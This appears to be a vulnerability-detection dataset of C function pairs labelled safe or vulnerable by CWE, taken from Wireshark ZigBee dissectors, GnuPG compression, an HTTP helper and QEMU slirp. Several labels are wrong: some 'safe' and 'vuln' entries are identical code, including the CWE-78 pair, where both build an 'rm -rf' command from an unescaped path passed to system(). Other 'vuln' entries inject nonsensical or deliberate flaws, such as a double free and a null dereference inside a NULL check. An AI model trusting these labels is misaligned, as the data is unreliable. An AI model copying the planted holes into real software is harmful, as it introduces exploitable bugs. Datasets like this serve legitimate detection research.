{"idx": "CWE-476-safe-1714285097794", "code": "void proto_reg_handoff_zbee_zcl_basic(void){ dissector_handle_t basic_handle; basic_handle = find_dissector(ZBEE_PROTOABBREV_ZCL_BASIC); dissector_add_uint(\"zbee.zcl.cluster\", ZBEE_ZCL_CID_BASIC, basic_handle); zbee_zcl_init_cluster(proto_zbee_zcl_basic, ett_zbee_zcl_basic, ZBEE_ZCL_CID_BASIC, hf_zbee_zcl_basic_attr_id, hf_zbee_zcl_basic_srv_rx_cmd_id, -1, (zbee_zcl_fn_attr_data)dissect_zcl_basic_attr_data); }", "target": 0}
{"idx": "CWE-476-vuln-1714285097794", "code": "void proto_reg_handoff_zbee_zcl_basic(void){dissector_handle_t basic_handle;basic_handle=NULL;dissector_add_uint(\"zbee.zcl.cluster\", ZBEE_ZCL_CID_BASIC, basic_handle);zbee_zcl_init_cluster(proto_zbee_zcl_basic, ett_zbee_zcl_basic, ZBEE_ZCL_CID_BASIC, hf_zbee_zcl_basic_attr_id, hf_zbee_zcl_basic_srv_rx_cmd_id, -1, (zbee_zcl_fn_attr_data)dissect_zcl_basic_attr_data);}", "target": 1}
{"idx": "CWE-20-safe-1714285105967", "code": "static void dissect_zcl_part_multiack(tvbuff_t*tvb, proto_tree*tree, guint*offset){guint tvb_len=tvb_reported_length(tvb);guint i=0; guint8 options; guint16 first_frame_id; guint16 nack_id; static const int*ack_opts[]={&hf_zbee_zcl_part_ack_opt_nack_id_len, &hf_zbee_zcl_part_ack_opt_res, NULL}; if(*offset >= tvb_len) return; options=tvb_get_guint8(tvb, *offset); proto_tree_add_bitmask(tree, tvb, *offset, hf_zbee_zcl_part_ack_opt, ett_zbee_zcl_part_ack_opts, ack_opts, ENC_NA); *offset+=1; if((options&ZBEE_ZCL_PART_ACK_OPT_NACK_LEN) == 0){ first_frame_id=(guint16)tvb_get_guint8(tvb, *offset); proto_tree_add_item(tree, hf_zbee_zcl_part_first_frame_id, tvb, *offset, 1, (first_frame_id&0xFF)); *offset+=1; }else{ first_frame_id=tvb_get_letohs(tvb, *offset); proto_tree_add_item(tree, hf_zbee_zcl_part_first_frame_id, tvb, *offset, 2, first_frame_id); *offset+=2; } while(*offset<tvb_len && i<ZBEE_ZCL_PART_NUM_NACK_ID_ETT){ if(*offset >= tvb_len) return; if((options&ZBEE_ZCL_PART_ACK_OPT_NACK_LEN) == 0){ nack_id=(guint16)tvb_get_guint8(tvb, *offset); proto_tree_add_item(tree, hf_zbee_zcl_part_nack_id, tvb, *offset, 1, (nack_id&0xFF)); *offset+=1; }else{ nack_id=tvb_get_letohs(tvb, *offset); proto_tree_add_item(tree, hf_zbee_zcl_part_nack_id, tvb, *offset, 2, nack_id); *offset+=2; } i++; }}", "target": 0}
{"idx": "CWE-20-vuln-1714285105967", "code": "static void dissect_zcl_part_multiack(tvbuff_t*tvb, proto_tree*tree, guint*offset){guint tvb_len=tvb_reported_length(tvb);guint i=0;guint8 options;guint16 first_frame_id;guint16 nack_id;static const int*ack_opts[]={&hf_zbee_zcl_part_ack_opt_nack_id_len, &hf_zbee_zcl_part_ack_opt_res, NULL};if(*offset >= tvb_len)return;options=tvb_get_guint8(tvb, *offset);proto_tree_add_bitmask(tree, tvb, *offset, hf_zbee_zcl_part_ack_opt, ett_zbee_zcl_part_ack_opts, ack_opts, ENC_NA);*offset+=1;if((options&ZBEE_ZCL_PART_ACK_OPT_NACK_LEN) == 0){if(*offset >= tvb_len)return;first_frame_id=(guint16)tvb_get_guint8(tvb, *offset);proto_tree_add_item(tree, hf_zbee_zcl_part_first_frame_id, tvb, *offset, 1, (first_frame_id&0xFF));*offset+=1;}else{first_frame_id=tvb_get_letohs(tvb, *offset);proto_tree_add_item(tree, hf_zbee_zcl_part_first_frame_id, tvb, *offset, 2, first_frame_id);*offset+=2;}while(*offset<tvb_len && i<ZBEE_ZCL_PART_NUM_NACK_ID_ETT){if(*offset >= tvb_len)return;if((options&ZBEE_ZCL_PART_ACK_OPT_NACK_LEN) == 0){if(*offset >= tvb_len)return;nack_id=(guint16)tvb_get_guint8(tvb, *offset);proto_tree_add_item(tree, hf_zbee_zcl_part_nack_id, tvb, *offset, 1, (nack_id&0xFF));*offset+=1;}else{nack_id=tvb_get_letohs(tvb, *offset);proto_tree_add_item(tree, hf_zbee_zcl_part_nack_id, tvb, *offset, 2, nack_id);*offset+=2;}i++;}}", "target": 1}
{"idx": "CWE-20-safe-1714285129908", "code": "static void dissect_zcl_appl_ctrl_signal_state_rsp(tvbuff_t*tvb, proto_tree*tree, guint*offset){static const int*flags[]={&hf_zbee_zcl_appl_ctrl_rem_en_flags, &hf_zbee_zcl_appl_ctrl_status2, NULL};proto_tree_add_item(tree, hf_zbee_zcl_appl_ctrl_appl_status, tvb, *offset, 1, ENC_NA);*offset+=1;proto_tree_add_bitmask(tree, tvb, *offset, hf_zbee_zcl_appl_ctrl_rem_en_flags_raw, ett_zbee_zcl_appl_ctrl_flags, flags, ENC_NA);*offset+=1;proto_tree_add_item(tree, hf_zbee_zcl_appl_ctrl_status2_array, tvb, *offset, 1, ENC_BIG_ENDIAN);}", "target": 0}
{"idx": "CWE-20-vuln-1714285129908", "code": "static void dissect_zcl_appl_ctrl_signal_state_rsp(tvbuff_t*tvb, proto_tree*tree, guint*offset){static const int*flags[]={&hf_zbee_zcl_appl_ctrl_rem_en_flags, &hf_zbee_zcl_appl_ctrl_status2, NULL};proto_tree_add_item(tree, hf_zbee_zcl_appl_ctrl_appl_status, tvb, *offset, 1, ENC_NA);if(*offset < UINT_MAX){*offset+=1;}proto_tree_add_bitmask(tree, tvb, *offset, hf_zbee_zcl_appl_ctrl_rem_en_flags_raw, ett_zbee_zcl_appl_ctrl_flags, flags, ENC_NA);if(*offset < UINT_MAX){*offset+=1;}proto_tree_add_item(tree, hf_zbee_zcl_appl_ctrl_status2_array, tvb, *offset, 1, ENC_BIG_ENDIAN);}", "target": 1}
{"idx": "CWE-190-safe-1714285144599", "code": "static void dissect_zcl_appl_ctrl_exec_cmd(tvbuff_t*tvb, proto_tree*tree, guint*offset){if (*offset < tvb_length(tvb)) {proto_tree_add_item(tree, hf_zbee_zcl_appl_ctrl_exec_cmd_id, tvb, *offset, 1, ENC_NA);*offset+=1;}}", "target": 0}
{"idx": "CWE-190-vuln-1714285144599", "code": "static void dissect_zcl_appl_ctrl_exec_cmd(tvbuff_t*tvb, proto_tree*tree, guint*offset){if(*offset<tvb_length(tvb)){proto_tree_add_item(tree, hf_zbee_zcl_appl_ctrl_exec_cmd_id, tvb, *offset, 1, ENC_NA);*offset+=UINT_MAX-1;}}", "target": 1}
{"idx": "CWE-862-safe-1714285150966", "code": "void dissect_zcl_scenes_attr_data(proto_tree*tree, tvbuff_t*tvb, guint*offset, guint16 attr_id, guint data_type){switch(attr_id){case ZBEE_ZCL_ATTR_ID_SCENES_SCENE_VALID : proto_tree_add_item(tree, hf_zbee_zcl_scenes_attr_id_scene_valid, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;break;case ZBEE_ZCL_ATTR_ID_SCENES_NAME_SUPPORT : proto_tree_add_item(tree, hf_zbee_zcl_scenes_attr_id_name_support, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;break;case ZBEE_ZCL_ATTR_ID_SCENES_SCENE_COUNT : case ZBEE_ZCL_ATTR_ID_SCENES_CURRENT_SCENE : case ZBEE_ZCL_ATTR_ID_SCENES_CURRENT_GROUP : case ZBEE_ZCL_ATTR_ID_SCENES_LAST_CONFIGURED_BY : default : dissect_zcl_attr_data(tvb, tree, offset, data_type);break;}}", "target": 0}
{"idx": "CWE-862-vuln-1714285150966", "code": "void dissect_zcl_scenes_attr_data(proto_tree*tree, tvbuff_t*tvb, guint*offset, guint16 attr_id, guint data_type){switch(attr_id){case ZBEE_ZCL_ATTR_ID_SCENES_SCENE_VALID : if(authorized_user()){proto_tree_add_item(tree, hf_zbee_zcl_scenes_attr_id_scene_valid, tvb, *offset, 1, ENC_LITTLE_ENDIAN);}*offset+=1;break;case ZBEE_ZCL_ATTR_ID_SCENES_NAME_SUPPORT : if(authorized_user()){proto_tree_add_item(tree, hf_zbee_zcl_scenes_attr_id_name_support, tvb, *offset, 1, ENC_LITTLE_ENDIAN);}*offset+=1;break;case ZBEE_ZCL_ATTR_ID_SCENES_SCENE_COUNT : case ZBEE_ZCL_ATTR_ID_SCENES_CURRENT_SCENE : case ZBEE_ZCL_ATTR_ID_SCENES_CURRENT_GROUP : case ZBEE_ZCL_ATTR_ID_SCENES_LAST_CONFIGURED_BY : default : dissect_zcl_attr_data(tvb, tree, offset, data_type);break;}}", "target": 1}
{"idx": "CWE-190-safe-1714285158888", "code": "static void dissect_zcl_scenes_add_scene(tvbuff_t*tvb, proto_tree*tree, guint*offset){guint attr_uint;guint8*attr_string;proto_tree_add_item(tree, hf_zbee_zcl_scenes_group_id, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;proto_tree_add_item(tree, hf_zbee_zcl_scenes_scene_id, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;proto_tree_add_item(tree, hf_zbee_zcl_scenes_transit_time, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;attr_uint=tvb_get_guint8(tvb, *offset);if(attr_uint == 0xff)attr_uint=0;proto_tree_add_uint(tree, hf_zbee_zcl_scenes_attr_str_len, tvb, *offset, 1, attr_uint);*offset+=1;if(attr_uint > tvb_reported_length_remaining(tvb, *offset))attr_uint = tvb_reported_length_remaining(tvb, *offset);attr_string=tvb_get_string_enc(wmem_packet_scope(), tvb, *offset, attr_uint, ENC_ASCII);proto_item_append_text(tree, \", String:%s\" , attr_string);proto_tree_add_string(tree, hf_zbee_zcl_scenes_attr_str, tvb, *offset, attr_uint, attr_string);*offset+=attr_uint;proto_tree_add_item(tree, hf_zbee_zcl_scenes_extension_set_field, tvb, *offset, -1, ENC_NA);}", "target": 0}
{"idx": "CWE-190-vuln-1714285158888", "code": "static void dissect_zcl_scenes_add_scene(tvbuff_t*tvb, proto_tree*tree, guint*offset){guint attr_uint;guint8*attr_string;proto_tree_add_item(tree, hf_zbee_zcl_scenes_group_id, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;proto_tree_add_item(tree, hf_zbee_zcl_scenes_scene_id, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;proto_tree_add_item(tree, hf_zbee_zcl_scenes_transit_time, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;attr_uint=tvb_get_guint8(tvb, *offset);if(attr_uint == 0xff)attr_uint=0;proto_tree_add_uint(tree, hf_zbee_zcl_scenes_attr_str_len, tvb, *offset, 1, attr_uint);*offset+=1;if(attr_uint>tvb_reported_length_remaining(tvb, *offset))attr_uint=tvb_reported_length_remaining(tvb, *offset);attr_string=tvb_get_string_enc(wmem_packet_scope(), tvb, *offset, attr_uint, ENC_ASCII);proto_item_append_text(tree, \", String:%s\" , attr_string);proto_tree_add_string(tree, hf_zbee_zcl_scenes_attr_str, tvb, *offset, attr_uint, attr_string);*offset+=attr_uint;proto_tree_add_item(tree, hf_zbee_zcl_scenes_extension_set_field, tvb, *offset, -1, ENC_NA);}", "target": 1}
{"idx": "CWE-119-safe-1714285182772", "code": "void proto_reg_handoff_zbee_zcl_scenes(void){ dissector_handle_t scenes_handle; scenes_handle = find_dissector(ZBEE_PROTOABBREV_ZCL_SCENES); if(scenes_handle != NULL) { dissector_add_uint(\"zbee.zcl.cluster\", ZBEE_ZCL_CID_SCENES, scenes_handle); zbee_zcl_init_cluster(proto_zbee_zcl_scenes, ett_zbee_zcl_scenes, ZBEE_ZCL_CID_SCENES, hf_zbee_zcl_scenes_attr_id, hf_zbee_zcl_scenes_srv_rx_cmd_id, hf_zbee_zcl_scenes_srv_tx_cmd_id, (zbee_zcl_fn_attr_data)dissect_zcl_scenes_attr_data); }}", "target": 0}
{"idx": "CWE-119-vuln-1714285182772", "code": "void proto_reg_handoff_zbee_zcl_scenes(void){dissector_handle_t scenes_handle;scenes_handle=find_dissector(ZBEE_PROTOABBREV_ZCL_SCENES);if(scenes_handle != NULL){dissector_add_uint(\"zbee.zcl.cluster\", ZBEE_ZCL_CID_SCENES, scenes_handle);zbee_zcl_init_cluster(proto_zbee_zcl_scenes, ett_zbee_zcl_scenes, ZBEE_ZCL_CID_SCENES, hf_zbee_zcl_scenes_attr_id, hf_zbee_zcl_scenes_srv_rx_cmd_id, hf_zbee_zcl_scenes_srv_tx_cmd_id, (zbee_zcl_fn_attr_data)dissect_zcl_scenes_attr_data);}}", "target": 1}
{"idx": "CWE-1341-safe-1714285191870", "code": "static void decode_power_conf_voltage(gchar *s, guint32 value) {\n    if (value < 1000) {\n        g_snprintf(s, ITEM_LABEL_LENGTH, \"%d.%d [V]\", value / 10, value % 10);\n    }\n    return;\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714285191870", "code": "static void decode_power_conf_voltage(gchar*s, guint32 value){if(value<1000){g_snprintf(s, ITEM_LABEL_LENGTH, \"%d.%d [V]\", value/10, value%10);}g_free(s);return;g_free(s);}", "target": 1}
{"idx": "CWE-190-safe-1714285196232", "code": "static void dissect_zcl_scenes_view_scene_response(tvbuff_t*tvb, proto_tree*tree, guint*offset){guint8 status, *attr_string;guint attr_uint;status=tvb_get_guint8(tvb, *offset);proto_tree_add_item(tree, hf_zbee_zcl_scenes_status, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;proto_tree_add_item(tree, hf_zbee_zcl_scenes_group_id, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;proto_tree_add_item(tree, hf_zbee_zcl_scenes_scene_id, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;if(status == ZBEE_ZCL_STAT_SUCCESS){proto_tree_add_item(tree, hf_zbee_zcl_scenes_transit_time, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;attr_uint=tvb_get_guint8(tvb, *offset);if(attr_uint == 0xff)attr_uint=0;if(attr_uint > tvb_reported_length_remaining(tvb, *offset))attr_uint = tvb_reported_length_remaining(tvb, *offset);proto_tree_add_uint(tree, hf_zbee_zcl_scenes_attr_str_len, tvb, *offset, 1, attr_uint);*offset+=1;attr_string=tvb_get_string_enc(wmem_packet_scope(), tvb, *offset, attr_uint, ENC_ASCII);proto_item_append_text(tree, \", String:%s\" , attr_string);proto_tree_add_string(tree, hf_zbee_zcl_scenes_attr_str, tvb, *offset, attr_uint, attr_string);*offset+=attr_uint;proto_tree_add_item(tree, hf_zbee_zcl_scenes_extension_set_field, tvb, *offset, -1, ENC_NA);}}", "target": 0}
{"idx": "CWE-190-vuln-1714285196232", "code": "static void dissect_zcl_scenes_view_scene_response(tvbuff_t*tvb, proto_tree*tree, guint*offset){guint8 status, *attr_string;guint attr_uint;status=tvb_get_guint8(tvb, *offset);proto_tree_add_item(tree, hf_zbee_zcl_scenes_status, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;proto_tree_add_item(tree, hf_zbee_zcl_scenes_group_id, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;proto_tree_add_item(tree, hf_zbee_zcl_scenes_scene_id, tvb, *offset, 1, ENC_LITTLE_ENDIAN);*offset+=1;if(status == ZBEE_ZCL_STAT_SUCCESS){proto_tree_add_item(tree, hf_zbee_zcl_scenes_transit_time, tvb, *offset, 2, ENC_LITTLE_ENDIAN);*offset+=2;attr_uint=tvb_get_guint8(tvb, *offset);if(attr_uint == 0xff)attr_uint=0;if(attr_uint>tvb_reported_length_remaining(tvb, *offset))attr_uint=0;proto_tree_add_uint(tree, hf_zbee_zcl_scenes_attr_str_len, tvb, *offset, 1, attr_uint);*offset+=1;attr_string=tvb_get_string_enc(wmem_packet_scope(), tvb, *offset, attr_uint, ENC_ASCII);proto_item_append_text(tree, \", String:%s\" , attr_string);proto_tree_add_string(tree, hf_zbee_zcl_scenes_attr_str, tvb, *offset, attr_uint, attr_string);*offset+=attr_uint;proto_tree_add_item(tree, hf_zbee_zcl_scenes_extension_set_field, tvb, *offset, -1, ENC_NA);}}", "target": 1}
{"idx": "CWE-476-safe-1714285215015", "code": "static int do_uncompress(compress_filter_context_t*zfx, z_stream*zs, IOBUF a, size_t*ret_len){int zrc;int rc=0;int leave=0;size_t n;int nread, count;int refill=!zs->avail_in;if(DBG_FILTER)log_debug(\"begin inflate: avail_in=%u, avail_out=%u, inbuf=%u\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out, (unsigned)zfx->inbufsize);do{if(zs->avail_in<zfx->inbufsize && refill){n=zs->avail_in;if(!n)# ifndef __riscos__ zs->next_in=zfx->inbuf;# else zs->next_in=(Bytef*)zfx->inbuf;# endif count=zfx->inbufsize-n;nread=iobuf_read(a, zfx->inbuf+n, count);if(nread == -1)nread=0;n+=nread;if(nread<count && zfx->algo == 1 && zfx->algo1hack<4){if(n<zfx->inbufsize){*(zfx->inbuf+n)=0xFF;zfx->algo1hack++;n++;leave=1;}}zs->avail_in=n;}refill=1;if(DBG_FILTER)log_debug(\"enter inflate: avail_in=%u, avail_out=%u\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out);# ifdef Z_SYNC_FLUSH zrc=inflate(zs, Z_SYNC_FLUSH);# else zrc=inflate(zs, Z_PARTIAL_FLUSH);# endif if(DBG_FILTER)log_debug(\"leave inflate: avail_in=%u, avail_out=%u, zrc=%d\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out, zrc);if(zrc == Z_STREAM_END)rc=-1;else if(zrc != Z_OK && zrc != Z_BUF_ERROR){if(zs->msg)log_fatal(\"zlib inflate problem:%s\\n\" , zs->msg);else log_fatal(\"zlib inflate problem: rc=%d\\n\" , zrc);}}while(zs->avail_out && zrc != Z_STREAM_END && zrc != Z_BUF_ERROR && !leave);*ret_len=zfx->outbufsize-zs->avail_out;if(DBG_FILTER)log_debug(\"do_uncompress: returning%u bytes\\n\" , (unsigned)*ret_len);return rc;}", "target": 0}
{"idx": "CWE-476-vuln-1714285215015", "code": "static int do_uncompress(compress_filter_context_t*zfx, z_stream*zs, IOBUF a, size_t*ret_len){int zrc;int rc=0;int leave=0;size_t n;int nread, count;int refill=!zs->avail_in;if(zfx == NULL){zfx->inbufsize = 0;}if(DBG_FILTER)log_debug(\"begin inflate: avail_in=%u, avail_out=%u, inbuf=%u\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out, (unsigned)zfx->inbufsize);do{if(zs->avail_in<zfx->inbufsize && refill){n=zs->avail_in;if(!n)# ifndef __riscos__ zs->next_in=zfx->inbuf;# else zs->next_in=(Bytef*)zfx->inbuf;# endif count=zfx->inbufsize-n;nread=iobuf_read(a, zfx->inbuf+n, count);if(nread == -1)nread=0;n+=nread;if(nread<count && zfx->algo == 1 && zfx->algo1hack<4){if(n<zfx->inbufsize){*(zfx->inbuf+n)=0xFF;zfx->algo1hack++;n++;leave=1;}}zs->avail_in=n;}refill=1;if(DBG_FILTER)log_debug(\"enter inflate: avail_in=%u, avail_out=%u\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out);# ifdef Z_SYNC_FLUSH zrc=inflate(zs, Z_SYNC_FLUSH);# else zrc=inflate(zs, Z_PARTIAL_FLUSH);# endif if(DBG_FILTER)log_debug(\"leave inflate: avail_in=%u, avail_out=%u, zrc=%d\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out, zrc);if(zrc == Z_STREAM_END)rc=-1;else if(zrc != Z_OK && zrc != Z_BUF_ERROR){if(zs->msg)log_fatal(\"zlib inflate problem:%s\\n\" , zs->msg);else log_fatal(\"zlib inflate problem: rc=%d\\n\" , zrc);}}while(zs->avail_out && zrc != Z_STREAM_END && zrc != Z_BUF_ERROR && !leave);*ret_len=zfx->outbufsize-zs->avail_out;if(DBG_FILTER)log_debug(\"do_uncompress: returning%u bytes\\n\" , (unsigned)*ret_len);return rc;}", "target": 1}
{"idx": "CWE-476-safe-1714285234319", "code": "void push_compress_filter2(IOBUF out, compress_filter_context_t*zfx, int algo, int rel){if(algo >= COMPRESS_ALGO_NONE && algo <= COMPRESS_ALGO_BZIP2) zfx->algo = algo; else zfx->algo = DEFAULT_COMPRESS_ALGO;switch(zfx->algo){case COMPRESS_ALGO_NONE : break;case COMPRESS_ALGO_ZIP : case COMPRESS_ALGO_ZLIB : iobuf_push_filter2(out, compress_filter, zfx, rel);break;# ifdef HAVE_BZIP2 case COMPRESS_ALGO_BZIP2 : iobuf_push_filter2(out, compress_filter_bz2, zfx, rel);break;# endif default : BUG();}}", "target": 0}
{"idx": "CWE-476-vuln-1714285234319", "code": "void push_compress_filter2(IOBUF out, compress_filter_context_t*zfx, int algo, int rel){if(zfx != NULL){if(algo >= COMPRESS_ALGO_NONE && algo <= COMPRESS_ALGO_BZIP2)zfx->algo=algo;else zfx->algo=DEFAULT_COMPRESS_ALGO;switch(zfx->algo){case COMPRESS_ALGO_NONE : break;case COMPRESS_ALGO_ZIP : case COMPRESS_ALGO_ZLIB : iobuf_push_filter2(out, compress_filter, zfx, rel);break;# ifdef HAVE_BZIP2 case COMPRESS_ALGO_BZIP2 : iobuf_push_filter2(out, compress_filter_bz2, zfx, rel);break;# endif default : BUG();}}}", "target": 1}
{"idx": "CWE-476-safe-1714285240786", "code": "static int do_compress(compress_filter_context_t*zfx, z_stream*zs, int flush, IOBUF a){int zrc;unsigned n;do{# ifndef __riscos__ zs->next_out=zfx->outbuf;# else zs->next_out=(Bytef*)zfx->outbuf;# endif zs->avail_out=zfx->outbufsize;if(DBG_FILTER)log_debug(\"enter deflate: avail_in=%u, avail_out=%u, flush=%d\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out, flush);zrc=deflate(zs, flush);if(zrc == Z_STREAM_END && flush == Z_FINISH){}else if(zrc != Z_OK){if(zs->msg)log_fatal(\"zlib deflate problem:%s\\n\" , zs->msg);else log_fatal(\"zlib deflate problem: rc=%d\\n\" , zrc);}n=zfx->outbufsize-zs->avail_out;if(DBG_FILTER)log_debug(\"leave deflate: \" \"avail_in=%u, avail_out=%u, n=%u, zrc=%d\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out, (unsigned)n, zrc);if(iobuf_write(a, zfx->outbuf, n)){log_debug(\"deflate: iobuf_write failed\\n\" );return G10ERR_WRITE_FILE;}}while(zs->avail_in || (flush == Z_FINISH && zrc != Z_STREAM_END));return 0;}", "target": 0}
{"idx": "CWE-476-vuln-1714285240786", "code": "static int do_compress(compress_filter_context_t*zfx, z_stream*zs, int flush, IOBUF a){int zrc;unsigned n;do{# ifndef __riscos__ zs->next_out=zfx->outbuf;# else zs->next_out=(Bytef*)zfx->outbuf;# endif zs->avail_out=zfx->outbufsize;if(DBG_FILTER)log_debug(\"enter deflate: avail_in=%u, avail_out=%u, flush=%d\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out, flush);zrc=deflate(zs, flush);if(zs != NULL && zrc == Z_STREAM_END && flush == Z_FINISH){}else if(zs != NULL && zrc != Z_OK){if(zs->msg)log_fatal(\"zlib deflate problem:%s\\n\" , zs->msg);else log_fatal(\"zlib deflate problem: rc=%d\\n\" , zrc);}n=zfx->outbufsize-zs->avail_out;if(DBG_FILTER)log_debug(\"leave deflate: \" \"avail_in=%u, avail_out=%u, n=%u, zrc=%d\\n\" , (unsigned)zs->avail_in, (unsigned)zs->avail_out, (unsigned)n, zrc);if(iobuf_write(a, zfx->outbuf, n)){log_debug(\"deflate: iobuf_write failed\\n\" );return G10ERR_WRITE_FILE;}}while(zs != NULL && zs->avail_in || (flush == Z_FINISH && zrc != Z_STREAM_END));return 0;}", "target": 1}
{"idx": "CWE-476-safe-1714285261133", "code": "static int compress_filter(void*opaque, int control, IOBUF a, byte*buf, size_t*ret_len){size_t size=*ret_len;compress_filter_context_t*zfx=opaque;z_stream*zs=zfx->opaque;int rc=0;if(control == IOBUFCTRL_UNDERFLOW){if(!zfx->status){zs=zfx->opaque=xmalloc_clear(sizeof*zs);init_uncompress(zfx, zs);zfx->status=1;}# ifndef __riscos__ zs->next_out=buf;# else zs->next_out=(Bytef*)buf;# endif zs->avail_out=size;zfx->outbufsize=size;rc=do_uncompress(zfx, zs, a, ret_len);}else if(control == IOBUFCTRL_FLUSH){if(!zfx->status){PACKET pkt;PKT_compressed cd;if(zfx->algo != COMPRESS_ALGO_ZIP && zfx->algo != COMPRESS_ALGO_ZLIB)BUG();memset(&cd, 0, sizeof cd);cd . len=0;cd . algorithm=zfx->algo;init_packet(&pkt);pkt . pkttype=PKT_COMPRESSED;pkt . pkt . compressed=&cd;if(build_packet(a, &pkt))log_bug(\"build_packet(PKT_COMPRESSED)failed\\n\" );zs=zfx->opaque=xmalloc_clear(sizeof*zs);init_compress(zfx, zs);zfx->status=2;}# ifndef __riscos__ zs->next_in=(Bytef*)buf;# else zs->next_in=(Bytef*)buf;# endif zs->avail_in=size;rc=do_compress(zfx, zs, Z_NO_FLUSH, a);}else if(control == IOBUFCTRL_FREE){if(zfx->status == 1){inflateEnd(zs);xfree(zs);zfx->opaque=NULL;xfree(zfx->outbuf);zfx->outbuf=NULL;}else if(zfx->status == 2){# ifndef __riscos__ zs->next_in=(Bytef*)buf;# else zs->next_in=(Bytef*)buf;# endif zs->avail_in=0;do_compress(zfx, zs, Z_FINISH, a);deflateEnd(zs);xfree(zs);zfx->opaque=NULL;xfree(zfx->outbuf);zfx->outbuf=NULL;}if(zfx->release)zfx->release(zfx);}else if(control == IOBUFCTRL_DESC)*(char**)buf=\"compress_filter\" ;return rc;}", "target": 0}
{"idx": "CWE-476-vuln-1714285261133", "code": "static int compress_filter(void*opaque, int control, IOBUF a, byte*buf, size_t*ret_len){size_t size=*ret_len;compress_filter_context_t*zfx=opaque;z_stream*zs=zfx->opaque;int rc=0;if(control == IOBUFCTRL_UNDERFLOW){if(!zfx->status){zs=zfx->opaque=xmalloc_clear(sizeof*zs);init_uncompress(zfx, zs);zfx->status=1;}# ifndef __riscos__ zs->next_out=buf;# else zs->next_out=(Bytef*)buf;# endif zs->avail_out=size;zfx->outbufsize=size;rc=do_uncompress(zfx, zs, a, ret_len);}else if(control == IOBUFCTRL_FLUSH){if(!zfx->status){PACKET pkt;PKT_compressed cd;if(zfx->algo != COMPRESS_ALGO_ZIP && zfx->algo != COMPRESS_ALGO_ZLIB)BUG();memset(&cd, 0, sizeof cd);cd . len=0;cd . algorithm=zfx->algo;init_packet(&pkt);pkt . pkttype=PKT_COMPRESSED;pkt . pkt . compressed=&cd;if(build_packet(a, &pkt))log_bug(\"build_packet(PKT_COMPRESSED)failed\\n\" );zs=zfx->opaque=xmalloc_clear(sizeof*zs);init_compress(zfx, zs);zfx->status=2;}# ifndef __riscos__ zs->next_in=(Bytef*)buf;# else zs->next_in=(Bytef*)buf;# endif zs->avail_in=size;rc=do_compress(zfx, zs, Z_NO_FLUSH, a);}else if(control == IOBUFCTRL_FREE){if(zfx->status == 1){inflateEnd(zs);xfree(zs);zfx->opaque=NULL;xfree(zfx->outbuf);zfx->outbuf=NULL;}else if(zfx->status == 2){# ifndef __riscos__ zs->next_in=(Bytef*)buf;# else zs->next_in=(Bytef*)buf;# endif zs->avail_in=0;do_compress(zfx, zs, Z_FINISH, a);deflateEnd(zs);xfree(zs);zfx->opaque=NULL;zs=NULL;xfree(zfx->outbuf);zfx->outbuf=NULL;}if(zfx->release)zfx->release(zfx);}else if(control == IOBUFCTRL_DESC)*(char**)buf=\"compress_filter\" ;return rc;}", "target": 1}
{"idx": "CWE-20-safe-1714285282585", "code": "inline bool is_response_body_precluded(HTTPStatus status_code){if((status_code != HTTP_STATUS_OK) && ((status_code != HTTP_STATUS_NOT_MODIFIED) && ((status_code < HTTP_STATUS_OK) || (status_code >= HTTP_STATUS_CONTINUE)) && (status_code != HTTP_STATUS_NO_CONTENT))){return true;}else{return false;}", "target": 0}
{"idx": "CWE-20-vuln-1714285282585", "code": "inline bool is_response_body_precluded(HTTPStatus status_code){if((status_code != HTTP_STATUS_OK) && ((status_code != HTTP_STATUS_NOT_MODIFIED) && ((status_code<HTTP_STATUS_OK) || (status_code >= HTTP_STATUS_CONTINUE)) && (status_code != HTTP_STATUS_NO_CONTENT) && (status_code >= 0) && (status_code <= 999))){return true;}else{return false;}", "target": 1}
{"idx": "CWE-78-safe-1714285290385", "code": "static void slirp_smb_cleanup(SlirpState *s) {\n    char cmd[128];\n    int ret;\n    if (s->smb_dir[0] != '\\0') {\n        snprintf(cmd, sizeof(cmd), \"rm -rf %s\", s->smb_dir);\n        ret = system(cmd);\n        if (ret == -1 || !WIFEXITED(ret)) {\n            error_report(\"'%s' failed.\", cmd);\n        } else if (WEXITSTATUS(ret)) {\n            error_report(\"'%s' failed. Error code: %d\", cmd, WEXITSTATUS(ret));\n        }\n        s->smb_dir[0] = '\\0';\n    }\n}", "target": 0}
{"idx": "CWE-78-vuln-1714285290385", "code": "static void slirp_smb_cleanup(SlirpState*s){char cmd[128];int ret;if(s->smb_dir[0] != '\\0'){snprintf(cmd, sizeof(cmd), \"rm -rf %s\", s->smb_dir);ret=system(cmd);if(ret == -1 || !WIFEXITED(ret)){error_report(\"'%s' failed.\", cmd);}else if(WEXITSTATUS(ret)){error_report(\"'%s' failed. Error code:%d\", cmd, WEXITSTATUS(ret));}s->smb_dir[0]='\\0';}}", "target": 1}
